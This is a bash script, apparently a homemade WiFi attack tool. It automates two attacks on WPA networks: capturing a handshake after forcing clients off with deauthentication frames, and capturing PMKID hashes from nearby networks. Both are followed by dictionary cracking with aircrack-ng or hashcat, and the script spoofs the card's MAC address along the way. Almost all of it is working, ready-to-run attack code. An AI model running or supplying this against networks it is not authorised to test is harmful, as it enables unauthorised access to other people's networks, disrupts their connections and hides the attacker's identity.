#!/usr/bin/bash

trap ctrl_c INT

# Colours

red='\033[0;31m'
green='\033[0;32m'
yellow='\033[0;33m'
blue='\033[0;34m'
magenta='\033[0;35m'
cyan='\033[0;36m'
white='\033[0;37m'
grey='\033[0;37m'
orange='\033[0;33m'
purple='\033[0;35m'
nc='\033[0m' # No Color

echo ""

function exit_script() {
    echo -e "\n${red}[-]${nc} Taking network card to monitor mode..."
    sleep 0.5
    airmon-ng stop ${network_card} &>/dev/null
    echo -e "${green}[+]${nc} Network card is now in managed mode."
    # restart network manager
    echo -e "\n${red}[-]${nc} Restarting network manager..."
    sleep 0.5
    service network-manager restart &>/dev/null
    service NetworkManager restart &>/dev/null
    service wpa_supplicant restart &>/dev/null
    echo -e "${green}[+]${nc} Network manager restarted."
    echo -e "\n${red}[-]${nc} Exiting..."
    tput cnorm; exit 0
}

function ctrl_c() {
    exit_script
}

function help_panel(){
    echo -e "Usage: $0 ${purple}-a attack_mode ${orange}"
    echo -e "\t${purple}a) Attack mode"
    echo -e "\tAvailable attack modes:"
    echo -e "\t\t${red}PMKID"
    echo -e "\t\tHandshake"
    echo -e "\t${blue}h) Help panel"
    echo -e "\tShow this help panel"

    echo -e "\n\t${white}Example: $0 -a PMKID${nc}"

    exit_script
}

function check_installer_manager(){
    confirmation="y"
    if [[ -f /usr/bin/apt ]]; then
        installer="apt"
    elif [[ -f /usr/bin/yum ]]; then
        installer="yum"
    elif [[ -f /usr/bin/pacman ]]; then
        installer="pacman"
        confirmation="Sy"
    else
        echo -e "${yellow}[-]${nc}No package manager found"
    fi
}

function install_hcxdumptool(){
    echo -e "${red}[-]${nc} Installing hcxdumptool..."
    sleep 0.5
    if [[ $installer == "apt" ]]; then
        apt install -y libcurl4-openssl-dev libssl-dev pkg-config &>/dev/null
    fi
    git clone https://github.com/ZerBea/hcxdumptool.git &>/dev/null
    cd hcxdumptool
    make 1>/dev/null
    make install 1>/dev/null
    cd ..
    rm -rf hcxdumptool &>/dev/null
}

function dependencies(){
    clear; programs=(aircrack-ng macchanger hcxdumptool hashcat tshark)

    echo -e "${yellow}[*]${nc} Checking dependencies...\n"
    sleep 2

    for program in "${programs[@]}"; do
        if ! command -v $program &> /dev/null; then
            check_installer_manager
            echo -e "${red}[-] ${nc}$program could not be found"
            $installer &> /dev/null
            if [[ $program == "hcxdumptool" ]] && [[ $installer != "pacman" ]]; then
                install_hcxdumptool
            else
                $installer install -Sy $program &> /dev/null
            fi
            if [ "$(echo $?)" == "0" ]; then
                echo -e "${yellow}[*]${nc} Installing $program with $installer"
                sleep 2
                echo -e "${grey}$ sudo $installer install $program${nc}"
                sudo $installer install $program -${confirmation} 1>/dev/null
                if [ "$(echo $?)" == "0" ]; then
                    echo -e "${green}[+]${nc} $program has been installed"
                else
                    echo -e "${red}[-]${nc} $program could not be installed"
                    exit_script
                fi
            else
                echo -e "${red}[-]${nc} Could not install $program"
                exit_script
            fi
        else
            echo -e "${green}[+]${nc} $program found"
            sleep 0.5
        fi
    done
    sleep 1
}

function select_target_network(){
    xterm -hold -e "airodump-ng ${network_card}"&
    airodump_xterm_pid=$!

    echo -e "\n${yellow}[*]${nc} Select the target network"

    echo -ne "${yellow}[*]${nc} Enter the BSSID of the target network: " && read ap_bssid
    echo -ne "${yellow}[*]${nc} Enter the channel of the target network: " && read ap_channel

    kill -9 $airodump_xterm_pid; wait $airodump_xterm_pid &>/dev/null
}

function handshake(){
    xterm -hold -e "airodump-ng -c $ap_channel -w "capture_${ap_bssid}" --bssid "${ap_bssid}" ${network_card}"&
    airodump_filter_xterm_pid=$!

    sleep 5; xterm -hold -e "aireplay-ng -0 15 -a ${ap_bssid} -c ff:ff:ff:ff:ff:ff ${network_card}"&
    aireplay_xterm_pid=$!

    sleep 10; kill -9 $aireplay_xterm_pid; wait $aireplay_xterm_pid &>/dev/null

    sleep 60 # Listen for 60 seconds

    tshark -r capture_${ap_bssid}-01.cap -Y "eapol"

    if [ "$(echo $?)" == "0" ]; then
        echo -e "${green}[+]${nc} Handshake captured"
        kill -9 $airodump_filter_xterm_pid; wait $airodump_filter_xterm_pid &>/dev/null
    else
        echo -e "${red}[-]${nc} Handshake could not be captured"
        echo -ne "${red}[-]${nc} Send s to stop listen [s]: " && read answer
        kill -9 $airodump_filter_xterm_pid; wait $airodump_filter_xterm_pid &>/dev/null
        echo -ne "${yellow}[?]${nc} Do you want to try again? [y/n]: " && read answer
        if [[ $answer == "y" ]]; then
            handshake
        fi
    fi

    xterm -hold -e "aircrack-ng -w /usr/share/wordlist/kaonashiWPA100M.txt capture_${ap_bssid}-01.cap" &
}

function pmkid(){
    echo -e "${yellow}[*]${nc} Start listening at $(date +%H:%M)...\n"
    timeout 120 bash -c "hcxdumptool -i ${network_card} --enable_status=1 -o capture_pmkid"
    echo -e "\n${yellow}[*]${nc} Obtaining hashes..."
    hash_name="hashes_pmkid_$(date +%y_%m_%d_%H_%M).hc22000"
    hcxpcapngtool -o ${hash_name} capture_pmkid; rm -rf capture_pmkid
    mkdir -p hashes_pmkid
    mv hashes_pmkid* hashes_pmkid &>/dev/null
    sleep 1

    test -f hashes_pmkid/${hash_name}

    if [ "$(echo $?)" == "0" ]; then

        echo -e "\n${yellow}[*]${nc} Initiating brute-force attack..."
        sleep 1
        xterm -hold -e "hashcat -m 22000 -a 0 hashes_pmkid/${hash_name} /usr/share/wordlist/kaonashiWPA100M.txt --force" &
    else
        echo -e "\n${red}[!]${nc} The hashes are not captured :("

        echo -ne "\n${purple}[?]${nc} Retry? (y/n): "; read option

        if [ "${option,,}" == "yes" ] || [ "${option,,}" == "y" ]; then
            echo -e "\n${yellow}[R]${nc} Retrying...\n"
            sleep 1
            pmkid
        fi
    fi
}

function attack(){
    clear

    choose_card

    echo -e "${starting}(_!_)${nc} Starting attack (attack_mode=$attack_mode || network_card=$network_card )\n"

    echo -e "${yellow}[*]${nc} Configuring network card"
    airmon-ng start $network_card &>/dev/null
    ifconfig ${network_card}mon &>/dev/null
    if [ "$(echo $?)" == "0" ]; then
        network_card="${network_card}mon"
    else
        ifconfig ${network_card} down && macchanger -a ${network_card} &>/dev/null
        ifconfig ${network_card} up &>/dev/null
    fi

    killall wpa_supplicant dhclient 2>/dev/null
    airmon-ng check kill &>/dev/null

    macaddress=$(macchanger -s ${network_card} | grep -i "Current" | xargs | cut -d ' ' -f '3-100')

    echo -e "\n${green}[*]${nc} New MAC address: $macaddress\n"

    if [[ "${attack_mode,,}" == "handshake" ]]; then
        select_target_network
        handshake
    elif [[ "${attack_mode,,}" == "pmkid" ]]; then
        pmkid
    else
        echo -e "${red}[-]${nc} Invalid attack mode"
        exit_script
    fi
    }

function choose_card(){
    echo -e "\n${yellow}[?]${nc} Choose a network card: "
    PS3="Network card: "
    select network_card in $(ifconfig | awk '{print $1}' | grep : | sed 's/://'); do
        echo -e "\n${yellow}[*]${nc} Card=${network_card}\n"
        sleep 0.05
        break
    done
}

# Main function

tput civis
while getopts ":a:h" arg; do
    case $arg in
        a) attack_mode=$OPTARG ;;
        h) help_panel ;;
        ?) echo -e "Invalid option: -$OPTARG\n"; help_panel ;;
    esac
done


if [ "$(id -u)" == "0" ]; then
    if [ -z "$attack_mode" ]; then
        echo -e "Missing arguments!\n"
        help_panel
    fi

    dependencies
    attack

    exit_script
else
    echo -e "${red}You must be root to run this script.${nc}"
    exit_script
fi

